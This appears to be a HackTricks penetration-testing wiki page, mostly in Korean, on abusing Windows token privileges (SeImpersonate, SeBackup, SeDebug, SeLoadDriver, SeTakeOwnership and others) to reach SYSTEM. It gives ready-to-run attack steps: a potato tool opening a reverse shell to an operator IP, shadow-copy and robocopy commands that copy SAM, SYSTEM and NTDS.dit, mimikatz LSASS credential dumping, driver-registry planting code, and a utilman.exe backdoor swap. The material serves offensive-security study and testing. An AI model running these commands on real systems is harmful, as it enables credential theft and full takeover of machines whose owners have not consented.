# 토큰 악용

{{#include ../../banners/hacktricks-training.md}}

## 토큰

**Windows Access Tokens가 무엇인지 모른다면** 계속하기 전에 이 페이지를 읽으세요:


{{#ref}}
access-tokens.md
{{#endref}}

**이미 가지고 있는 토큰을 악용해서 권한 상승을 할 수 있을지도 모릅니다**

### SeImpersonatePrivilege

이 권한은 어떤 프로세스가 보유하고 있으면, 핸들을 얻을 수 있다는 전제하에 어떤 토큰이든 impersonation(하지만 생성은 아님)할 수 있게 해줍니다. 특권 토큰은 exploit에 대해 NTLM authentication을 수행하도록 Windows service(DCOM)를 유도함으로써 획득할 수 있으며, 이후 SYSTEM privileges로 프로세스를 실행할 수 있게 됩니다. 이 vulnerability는 [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (winrm이 비활성화되어 있어야 함), [SweetPotato](https://github.com/CCob/SweetPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) 같은 다양한 tools를 사용해 exploit할 수 있습니다.

Modern operator notes:

- **JuicyPotato is legacy**: Windows 10 1809+/Server 2019+에서는, 아직 reachable한 RPC/COM surface에 따라 **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, 또는 **PrintSpoofer**를 우선 사용하세요.
- **LOCAL SERVICE** 또는 **NETWORK SERVICE**로 실행 중인 service를 compromise했고 `whoami /priv`에서 **filtered token** 때문에 `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`가 보이지 않는다면, 먼저 해당 계정의 **default privilege set**을 복구한 뒤(예: **FullPowers** 사용) 그 다음 potato family를 다시 시도하세요.
- 일부 더 새로운 fork들은 원래 tools보다 operator 친화적입니다. 예를 들어 **SigmaPotato**는 reflection/in-memory execution과 최신 Windows 호환성을 추가했고, **PrintNotifyPotato**는 PrintNotify COM service를 abuse하며 classic Spooler 경로가 비활성화된 경우 자주 유용합니다.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

It is very similar to **SeImpersonatePrivilege**, it will use the **same method** to get a privileged token.\
Then, this privilege allows **to assign a primary token** to a new/suspended process. With the privileged impersonation token you can derivate a primary token (DuplicateTokenEx).\
With the token, you can create a **new process** with 'CreateProcessAsUser' or create a process suspended and **set the token** (in general, you cannot modify the primary token of a running process).

### SeTcbPrivilege

If you have enabled this token you can use **KERB_S4U_LOGON** to get an **impersonation token** for any other user without knowing the credentials, **add an arbitrary group** (admins) to the token, set the **integrity level** of the token to "**medium**", and assign this token to the **current thread** (SetThreadToken).

### SeBackupPrivilege

The system is caused to **grant all read access** control to any file (limited to read operations) by this privilege. It is utilized for **reading the password hashes of local Administrator** accounts from the registry, following which, tools like "**psexec**" or "**wmiexec**" can be used with the hash (Pass-the-Hash technique). However, this technique fails under two conditions: when the Local Administrator account is disabled, or when a policy is in place that removes administrative rights from Local Administrators connecting remotely.\
In practice, the most reliable built-in workflow is usually **VSS + `robocopy /b`**: create/expose a shadow copy, then copy `SAM`/`SYSTEM` or `NTDS.dit` in **backup mode**, which bypasses the file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

**파일의 Access Control List (ACL)**와 무관하게, 모든 system file에 대한 **write access** 권한을 제공하는 privilege입니다. 이 privilege는 **services 수정**, DLL Hijacking 수행, Image File Execution Options를 통해 **debuggers** 설정 등 다양한 기회를 열어줍니다.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege는 강력한 권한으로, 특히 사용자가 tokens를 impersonate할 수 있을 때 유용하며, SeImpersonatePrivilege가 없어도 사용할 수 있습니다. 이 기능은 동일한 사용자를 나타내고 현재 process의 integrity level을 초과하지 않는 token을 impersonate할 수 있는 능력에 달려 있습니다.

**Key Points:**

- **SeImpersonatePrivilege 없이 impersonation:** 특정 조건에서 SeCreateTokenPrivilege를 활용해 EoP를 수행하는 것이 가능합니다.
- **Token impersonation 조건:** 성공적인 impersonation을 위해서는 대상 token이 동일한 사용자에 속해야 하며, impersonation을 시도하는 process의 integrity level보다 작거나 같아야 합니다.
- **Impersonation token 생성 및 수정:** 사용자는 impersonation token을 생성하고 privileged group의 SID (Security Identifier)를 추가하여 이를 강화할 수 있습니다.

### SeLoadDriverPrivilege

이 privilege는 `ImagePath`와 `Type`에 특정 값을 가진 registry entry를 생성하여 device drivers를 **load and unload**할 수 있게 합니다. `HKLM` (HKEY_LOCAL_MACHINE)에 대한 직접적인 write access는 제한되므로, 대신 `HKCU` (HKEY_CURRENT_USER)를 사용해야 합니다. 하지만 kernel이 driver configuration을 위해 `HKCU`를 인식하게 하려면 특정 path를 따라야 합니다.

Modern offensive use is usually **BYOVD** (bring your own vulnerable driver): load a **signed but vulnerable** kernel driver and then use its IOCTLs to disable protections or jump to kernel code execution. Keep in mind that on recent Windows 11/Server builds the **Microsoft vulnerable driver blocklist** and/or **HVCI/Memory Integrity** often break older public chains, so the classic `szkg64.sys`-style examples are no longer universally reliable.

이 path는 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`이며, 여기서 `<RID>`는 현재 사용자의 Relative Identifier입니다. `HKCU` 내부에서는 이 전체 path를 생성해야 하며, 두 개의 값을 설정해야 합니다:

- `ImagePath`, 실행할 binary의 path
- `Type`, 값은 `SERVICE_KERNEL_DRIVER` (`0x00000001`)

**따라야 할 Steps:**

1. 제한된 write access 때문에 `HKLM` 대신 `HKCU`에 접근합니다.
2. `HKCU` 내부에 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` path를 생성하며, 여기서 `<RID>`는 현재 사용자의 Relative Identifier를 의미합니다.
3. `ImagePath`를 binary의 execution path로 설정합니다.
4. `Type`을 `SERVICE_KERNEL_DRIVER` (`0x00000001`)로 지정합니다.
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
이 권한을 악용하는 더 많은 방법은 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

이것은 **SeRestorePrivilege**와 비슷하다. 주요 기능은 프로세스가 **객체의 소유권을 가져오도록** 허용하며, WRITE_OWNER access rights를 제공함으로써 명시적인 discretionary access 요구를 우회한다. 이 과정은 먼저 쓰기 목적을 위해 대상 registry key의 소유권을 확보한 다음, DACL을 변경하여 write operations를 가능하게 하는 것이다.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

이 권한은 **다른 프로세스를 디버그**할 수 있게 하며, 메모리의 읽기와 쓰기도 포함합니다. 이 권한을 사용하면 대부분의 antivirus와 host intrusion prevention 솔루션을 우회할 수 있는 다양한 memory injection 기법을 적용할 수 있습니다.

현대 Windows에서는 `SeDebugPrivilege`가 보통 **non-protected SYSTEM processes**를 열고 그 token을 duplicate하는 데 충분하다는 점을 기억하세요. 하지만 이것이 **LSASS**에 접근할 수 있다는 보장은 **아닙니다**. **RunAsPPL / LSA Protection**이 활성화되어 있으면, `SeDebugPrivilege`가 있어도 non-protected processes는 LSASS를 읽거나 inject할 수 없습니다. 이 경우 `procdump`가 동작한다고 가정하지 말고, 다른 non-PPL SYSTEM process에서 token을 steal하거나 PPL bypass/BYOVD와 체인하세요. `SeDebugPrivilege` + `SeImpersonatePrivilege`를 사용하는 전체 token-copy 예시는 [this page](sedebug-+-seimpersonate-copy-token.md)를 확인하세요.

#### Dump memory

[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)를 [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)에서 사용해 **프로세스의 메모리를 캡처**할 수 있습니다. 특히 이는 사용자가 시스템에 성공적으로 로그인한 뒤 사용자 credentials를 저장하는 역할을 하는 **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** 프로세스에 적용할 수 있습니다.

그런 다음 이 덤프를 mimikatz에 로드하여 passwords를 얻을 수 있습니다:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

`NT SYSTEM` shell을 얻고 싶다면 다음을 사용할 수 있습니다:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

이 권한(Perform volume maintenance tasks)은 원시 볼륨 디바이스 핸들(예: \\.\C:)을 열어 NTFS ACLs를 우회하는 직접 디스크 I/O를 허용합니다. 이를 통해 기본 블록을 읽어서 볼륨 내의 어떤 파일이든 바이트 단위로 복사할 수 있으며, 민감한 자료에 대한 임의 파일 읽기를 가능하게 합니다(예: %ProgramData%\Microsoft\Crypto\의 machine private keys, registry hives, VSS를 통한 SAM/NTDS). 특히 CA servers에서 영향이 큰데, CA private key를 exfiltrating하면 Golden Certificate를 forging하여 어떤 principal이든 impersonate할 수 있습니다.

자세한 기술과 완화 방법은 다음을 보세요:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
**Disabled**로 표시되는 tokens는 보통 enable할 수 있으므로, _Enabled_와 _Disabled_ privileges 둘 다 종종 abuse할 수 있습니다.

### 모든 token enable하기

disabled privileges가 있다면, script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)를 사용해 모든 tokens를 enable할 수 있습니다:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or the **script** embedded in this [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Windows token에 대한 전체 cheat sheet는 [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)에서 확인할 수 있으며, 아래 요약에는 privilege를 이용해 admin session을 얻거나 민감한 파일을 읽는 직접적인 방법만 나열합니다.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------  | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | 업데이트해 준 [Aurélien Chalot](https://twitter.com/Defte_)에게 감사드립니다. 곧 더 recipe-like하게 다시 표현해 보겠습니다.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | `robocopy /b` 또는 SeBackup-aware 전용 copy helper를 사용해 민감한 파일을 읽습니다.                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, 그리고 때때로 `%WINDIR%\MEMORY.DMP`에 특히 유용합니다.<br><br>- `robocopy`도 편리하지만, 전용 SeBackup cmdlet/API가 잠겨 있거나 열린 파일에는 더 유연한 경우가 많습니다.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken`으로 local admin 권한을 포함한 임의의 token을 만듭니다.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **non-PPL** SYSTEM token을 복제하거나, 보호되지 않은 process의 memory를 덤프합니다.                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection이 활성화되어 있으면 LSASS dumping이 흔히 차단됩니다.</p><p>Script는 [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)에서 찾을 수 있습니다.</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | **Potato family** / named-pipe impersonation을 사용해 SYSTEM을 실행합니다(`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>서비스 계정(IIS APPPOOL, MSSQL, scheduled tasks 등)이나 이미 `SeImpersonatePrivilege`를 가진 context에서 가장 실용적입니다.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. 서명되어 있지만 취약한 kernel driver(BYOVD)를 로드합니다.<br>2. driver의 IOCTL을 사용해 kernel R/W를 얻고, security tooling을 비활성화하거나 SYSTEM으로 권한 상승합니다.<br><br>또는 `fltMC` builtin command로 security 관련 driver를 언로드하는 데 이 privilege를 사용할 수도 있습니다. 예: `fltMC sysmondrv`</p>                     | <p>`szkg64.sys` 같은 오래된 public driver는 vulnerable-driver blocklist / HVCI 때문에 최신 Windows에서 점점 더 차단됩니다.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege가 존재하는 상태로 PowerShell/ISE를 실행합니다.<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>로 privilege를 활성화합니다).<br>3. utilman.exe를 utilman.old로 이름 변경합니다.<br>4. cmd.exe를 utilman.exe로 이름 변경합니다.<br>5. console을 잠그고 Win+U를 누릅니다</p> | <p>공격은 일부 AV software에 의해 탐지될 수 있습니다.</p><p>대안 방법은 같은 privilege를 사용해 "Program Files"에 저장된 service binary를 교체하는 데 의존합니다</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe를 utilman.exe로 이름 변경합니다<br>4. console을 잠그고 Win+U를 누릅니다</p>                                                                                                                                       | <p>공격은 일부 AV software에 의해 탐지될 수 있습니다.</p><p>대안 방법은 같은 privilege를 사용해 "Program Files"에 저장된 service binary를 교체하는 데 의존합니다.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>token을 조작해 local admin 권한을 포함시킵니다. SeImpersonate가 필요할 수 있습니다.</p><p>검증 필요.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Windows token을 정의하는 이 table을 확인해 보세요: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- token을 이용한 privesc에 관한 [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)를 확인해 보세요.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
